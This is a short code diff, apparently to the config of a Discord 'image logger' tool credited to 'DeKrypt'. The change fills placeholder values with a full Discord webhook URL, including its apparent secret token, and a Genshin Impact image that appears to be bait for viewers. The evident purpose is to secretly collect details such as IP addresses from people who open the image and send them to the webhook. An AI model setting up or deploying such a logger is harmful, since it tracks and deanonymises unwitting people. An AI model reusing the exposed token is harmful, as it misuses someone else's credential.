@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1352632306115940433/7tqvdYejrCap8eEw73Wa47MsrR6ua0IMz7WWWRqhc0hDa2x74vzIQ-yFCFRHmE6vnK0I",
+    "image": "https://static1.srcdn.com/wordpress/wp-content/uploads/2020/10/xaio-genshin-impact-liyue-background-character-builds.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
